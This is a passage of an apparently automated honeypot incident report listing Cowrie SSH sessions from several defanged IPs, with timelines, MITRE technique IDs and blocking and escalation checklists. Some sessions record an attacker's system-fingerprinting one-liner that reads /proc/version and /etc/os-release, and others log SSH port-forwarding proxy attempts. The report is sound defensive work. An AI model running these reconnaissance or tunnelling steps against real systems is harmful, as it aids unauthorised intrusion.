| `2026-08-04 12:26:12` | `cowrie.session.params` |
| `2026-08-04 12:26:12` | `cowrie.command.input` |
| `2026-08-04 12:26:12` | `cowrie.command.failed` |
| `2026-08-04 12:26:12` | `cowrie.command.failed` |
| `2026-08-04 12:27:14` | `cowrie.session.params` |
| `2026-08-04 12:27:14` | `cowrie.command.input` |
| `2026-08-04 12:28:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f409076aa73a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:26 |
| **Last Seen** | 2026-08-04 12:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:26:16` | `cowrie.session.connect` |
| `2026-08-04 12:26:16` | `cowrie.client.version` |
| `2026-08-04 12:26:16` | `cowrie.client.kex` |
| `2026-08-04 12:26:18` | `cowrie.login.success` |
| `2026-08-04 12:26:20` | `cowrie.session.params` |
| `2026-08-04 12:26:20` | `cowrie.command.input` |
| `2026-08-04 12:26:20` | `cowrie.command.input` |
| `2026-08-04 12:26:20` | `cowrie.command.input` |
| `2026-08-04 12:26:20` | `cowrie.command.input` |
| `2026-08-04 12:26:20` | `cowrie.command.input` |
| `2026-08-04 12:26:20` | `cowrie.command.success` |
| `2026-08-04 12:26:20` | `cowrie.command.input` |
| `2026-08-04 12:26:20` | `cowrie.command.input` |
| `2026-08-04 12:26:20` | `cowrie.command.input` |
| `2026-08-04 12:26:20` | `cowrie.command.input` |
| `2026-08-04 12:26:21` | `cowrie.log.closed` |
| `2026-08-04 12:26:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11e78cc532b0

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:27 |
| **Last Seen** | 2026-08-04 12:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:27:07` | `cowrie.session.connect` |
| `2026-08-04 12:27:07` | `cowrie.client.version` |
| `2026-08-04 12:27:07` | `cowrie.client.kex` |
| `2026-08-04 12:27:08` | `cowrie.login.success` |
| `2026-08-04 12:27:08` | `cowrie.session.params` |
| `2026-08-04 12:27:08` | `cowrie.command.input` |
| `2026-08-04 12:27:09` | `cowrie.log.closed` |
| `2026-08-04 12:27:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87e13d9ad2ac

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:27 |
| **Last Seen** | 2026-08-04 12:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:27:54` | `cowrie.session.connect` |
| `2026-08-04 12:27:54` | `cowrie.client.version` |
| `2026-08-04 12:27:54` | `cowrie.client.kex` |
| `2026-08-04 12:27:56` | `cowrie.login.success` |
| `2026-08-04 12:27:57` | `cowrie.session.params` |
| `2026-08-04 12:27:57` | `cowrie.command.input` |
| `2026-08-04 12:27:57` | `cowrie.command.input` |
| `2026-08-04 12:27:58` | `cowrie.command.input` |
| `2026-08-04 12:27:58` | `cowrie.command.input` |
| `2026-08-04 12:27:58` | `cowrie.command.input` |
| `2026-08-04 12:27:58` | `cowrie.command.success` |
| `2026-08-04 12:27:58` | `cowrie.command.input` |
| `2026-08-04 12:27:58` | `cowrie.command.input` |
| `2026-08-04 12:27:58` | `cowrie.command.input` |
| `2026-08-04 12:27:58` | `cowrie.command.input` |
| `2026-08-04 12:27:58` | `cowrie.log.closed` |
| `2026-08-04 12:27:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9070a8367b7

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:28 |
| **Last Seen** | 2026-08-04 12:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:28:42` | `cowrie.session.connect` |
| `2026-08-04 12:28:42` | `cowrie.client.version` |
| `2026-08-04 12:28:42` | `cowrie.client.kex` |
| `2026-08-04 12:28:43` | `cowrie.login.success` |
| `2026-08-04 12:28:44` | `cowrie.session.params` |
| `2026-08-04 12:28:44` | `cowrie.command.input` |
| `2026-08-04 12:28:44` | `cowrie.log.closed` |
| `2026-08-04 12:28:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a9e913c957b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:29 |
| **Last Seen** | 2026-08-04 12:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:29:35` | `cowrie.session.connect` |
| `2026-08-04 12:29:35` | `cowrie.client.version` |
| `2026-08-04 12:29:35` | `cowrie.client.kex` |
| `2026-08-04 12:29:36` | `cowrie.login.success` |
| `2026-08-04 12:29:38` | `cowrie.session.params` |
| `2026-08-04 12:29:38` | `cowrie.command.input` |
| `2026-08-04 12:29:38` | `cowrie.command.input` |
| `2026-08-04 12:29:38` | `cowrie.command.input` |
| `2026-08-04 12:29:38` | `cowrie.command.input` |
| `2026-08-04 12:29:38` | `cowrie.command.input` |
| `2026-08-04 12:29:38` | `cowrie.command.success` |
| `2026-08-04 12:29:38` | `cowrie.command.input` |
| `2026-08-04 12:29:38` | `cowrie.command.input` |
| `2026-08-04 12:29:38` | `cowrie.command.input` |
| `2026-08-04 12:29:38` | `cowrie.command.input` |
| `2026-08-04 12:29:39` | `cowrie.log.closed` |
| `2026-08-04 12:29:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f76cd6710a77

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:30 |
| **Last Seen** | 2026-08-04 12:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:30:21` | `cowrie.session.connect` |
| `2026-08-04 12:30:21` | `cowrie.client.version` |
| `2026-08-04 12:30:21` | `cowrie.client.kex` |
| `2026-08-04 12:30:21` | `cowrie.login.success` |
| `2026-08-04 12:30:22` | `cowrie.session.params` |
| `2026-08-04 12:30:22` | `cowrie.command.input` |
| `2026-08-04 12:30:22` | `cowrie.log.closed` |
| `2026-08-04 12:30:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a78055ca8c6f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:31 |
| **Last Seen** | 2026-08-04 12:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:31:17` | `cowrie.session.connect` |
| `2026-08-04 12:31:17` | `cowrie.client.version` |
| `2026-08-04 12:31:17` | `cowrie.client.kex` |
| `2026-08-04 12:31:18` | `cowrie.login.success` |
| `2026-08-04 12:31:19` | `cowrie.session.params` |
| `2026-08-04 12:31:19` | `cowrie.command.input` |
| `2026-08-04 12:31:19` | `cowrie.command.input` |
| `2026-08-04 12:31:19` | `cowrie.command.input` |
| `2026-08-04 12:31:19` | `cowrie.command.input` |
| `2026-08-04 12:31:19` | `cowrie.command.input` |
| `2026-08-04 12:31:19` | `cowrie.command.success` |
| `2026-08-04 12:31:19` | `cowrie.command.input` |
| `2026-08-04 12:31:19` | `cowrie.command.input` |
| `2026-08-04 12:31:19` | `cowrie.command.input` |
| `2026-08-04 12:31:19` | `cowrie.command.input` |
| `2026-08-04 12:31:20` | `cowrie.log.closed` |
| `2026-08-04 12:31:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63a8ccf608a0

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:31 |
| **Last Seen** | 2026-08-04 12:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:31:56` | `cowrie.session.connect` |
| `2026-08-04 12:31:56` | `cowrie.client.version` |
| `2026-08-04 12:31:56` | `cowrie.client.kex` |
| `2026-08-04 12:31:57` | `cowrie.login.success` |
| `2026-08-04 12:31:58` | `cowrie.session.params` |
| `2026-08-04 12:31:58` | `cowrie.command.input` |
| `2026-08-04 12:31:58` | `cowrie.log.closed` |
| `2026-08-04 12:31:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3fb23d5906d

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]41` |
| **First Seen** | 2026-08-04 12:32 |
| **Last Seen** | 2026-08-04 12:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:32:34` | `cowrie.session.connect` |
| `2026-08-04 12:32:34` | `cowrie.client.version` |
| `2026-08-04 12:32:34` | `cowrie.client.kex` |
| `2026-08-04 12:32:35` | `cowrie.login.success` |
| `2026-08-04 12:32:35` | `cowrie.direct-tcpip.request` |
| `2026-08-04 12:32:35` | `cowrie.direct-tcpip.data` |
| `2026-08-04 12:32:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]41` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ff0655b2f5a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:32 |
| **Last Seen** | 2026-08-04 12:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:32:55` | `cowrie.session.connect` |
| `2026-08-04 12:32:55` | `cowrie.client.version` |
| `2026-08-04 12:32:55` | `cowrie.client.kex` |
| `2026-08-04 12:32:57` | `cowrie.login.success` |
| `2026-08-04 12:33:00` | `cowrie.session.params` |
| `2026-08-04 12:33:00` | `cowrie.command.input` |
| `2026-08-04 12:33:00` | `cowrie.command.input` |
| `2026-08-04 12:33:00` | `cowrie.command.input` |
| `2026-08-04 12:33:00` | `cowrie.command.input` |
| `2026-08-04 12:33:00` | `cowrie.command.input` |
| `2026-08-04 12:33:00` | `cowrie.command.success` |
| `2026-08-04 12:33:00` | `cowrie.command.input` |
| `2026-08-04 12:33:00` | `cowrie.command.input` |
| `2026-08-04 12:33:00` | `cowrie.command.input` |
| `2026-08-04 12:33:00` | `cowrie.command.input` |
| `2026-08-04 12:33:00` | `cowrie.log.closed` |
| `2026-08-04 12:33:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d000262d2c65

| Field | Detail |
|---|---|
| **Source IP** | `23.30.11[.]253` |
| **First Seen** | 2026-08-04 12:33 |
| **Last Seen** | 2026-08-04 12:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:33:29` | `cowrie.session.connect` |
| `2026-08-04 12:33:29` | `cowrie.client.version` |
| `2026-08-04 12:33:29` | `cowrie.client.kex` |
| `2026-08-04 12:33:30` | `cowrie.login.success` |
| `2026-08-04 12:33:30` | `cowrie.direct-tcpip.request` |
| `2026-08-04 12:33:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.30.11[.]253` to AbuseIPDB if not already reported
- [ ] Block `23.30.11[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bcc442f842b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:33 |
| **Last Seen** | 2026-08-04 12:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:33:32` | `cowrie.session.connect` |
| `2026-08-04 12:33:32` | `cowrie.client.version` |
| `2026-08-04 12:33:32` | `cowrie.client.kex` |
| `2026-08-04 12:33:32` | `cowrie.login.success` |
| `2026-08-04 12:33:33` | `cowrie.session.params` |
| `2026-08-04 12:33:33` | `cowrie.command.input` |
| `2026-08-04 12:33:33` | `cowrie.log.closed` |
| `2026-08-04 12:33:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-139e8a243704

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]182` |
| **First Seen** | 2026-08-04 12:33 |
| **Last Seen** | 2026-08-04 12:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:33:33` | `cowrie.session.connect` |
| `2026-08-04 12:33:33` | `cowrie.client.version` |
| `2026-08-04 12:33:33` | `cowrie.client.kex` |
| `2026-08-04 12:33:33` | `cowrie.login.success` |
| `2026-08-04 12:33:33` | `cowrie.direct-tcpip.request` |
| `2026-08-04 12:33:33` | `cowrie.direct-tcpip.data` |
| `2026-08-04 12:33:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]182` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42b38aa45507

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]192` |
| **First Seen** | 2026-08-04 12:34 |
| **Last Seen** | 2026-08-04 12:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:34:11` | `cowrie.session.connect` |
| `2026-08-04 12:34:11` | `cowrie.client.version` |
| `2026-08-04 12:34:11` | `cowrie.client.kex` |
| `2026-08-04 12:34:12` | `cowrie.login.success` |
| `2026-08-04 12:34:12` | `cowrie.direct-tcpip.request` |
| `2026-08-04 12:34:12` | `cowrie.direct-tcpip.data` |
| `2026-08-04 12:34:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]192` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3af97c8301f2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:34 |
| **Last Seen** | 2026-08-04 12:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:34:33` | `cowrie.session.connect` |
| `2026-08-04 12:34:34` | `cowrie.client.version` |
| `2026-08-04 12:34:34` | `cowrie.client.kex` |
| `2026-08-04 12:34:35` | `cowrie.login.success` |
| `2026-08-04 12:34:37` | `cowrie.session.params` |
| `2026-08-04 12:34:37` | `cowrie.command.input` |
| `2026-08-04 12:34:37` | `cowrie.command.input` |
| `2026-08-04 12:34:37` | `cowrie.command.input` |
| `2026-08-04 12:34:37` | `cowrie.command.input` |
| `2026-08-04 12:34:37` | `cowrie.command.input` |
| `2026-08-04 12:34:37` | `cowrie.command.success` |
| `2026-08-04 12:34:37` | `cowrie.command.input` |
| `2026-08-04 12:34:37` | `cowrie.command.input` |
| `2026-08-04 12:34:37` | `cowrie.command.input` |
| `2026-08-04 12:34:37` | `cowrie.command.input` |
| `2026-08-04 12:34:37` | `cowrie.log.closed` |
| `2026-08-04 12:34:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe900c6d055a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:35 |
| **Last Seen** | 2026-08-04 12:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:35:14` | `cowrie.session.connect` |
| `2026-08-04 12:35:14` | `cowrie.client.version` |
| `2026-08-04 12:35:14` | `cowrie.client.kex` |
| `2026-08-04 12:35:14` | `cowrie.login.success` |
| `2026-08-04 12:35:15` | `cowrie.session.params` |
| `2026-08-04 12:35:15` | `cowrie.command.input` |
| `2026-08-04 12:35:15` | `cowrie.log.closed` |
| `2026-08-04 12:35:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb93bbe98d4a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:36 |
| **Last Seen** | 2026-08-04 12:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:36:12` | `cowrie.session.connect` |
| `2026-08-04 12:36:12` | `cowrie.client.version` |
| `2026-08-04 12:36:12` | `cowrie.client.kex` |
| `2026-08-04 12:36:13` | `cowrie.login.success` |
| `2026-08-04 12:36:15` | `cowrie.session.params` |
| `2026-08-04 12:36:15` | `cowrie.command.input` |
| `2026-08-04 12:36:15` | `cowrie.command.input` |
| `2026-08-04 12:36:15` | `cowrie.command.input` |
| `2026-08-04 12:36:15` | `cowrie.command.input` |
| `2026-08-04 12:36:15` | `cowrie.command.input` |
| `2026-08-04 12:36:15` | `cowrie.command.success` |
| `2026-08-04 12:36:15` | `cowrie.command.input` |
| `2026-08-04 12:36:15` | `cowrie.command.input` |
| `2026-08-04 12:36:15` | `cowrie.command.input` |
| `2026-08-04 12:36:15` | `cowrie.command.input` |
| `2026-08-04 12:36:16` | `cowrie.log.closed` |
| `2026-08-04 12:36:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

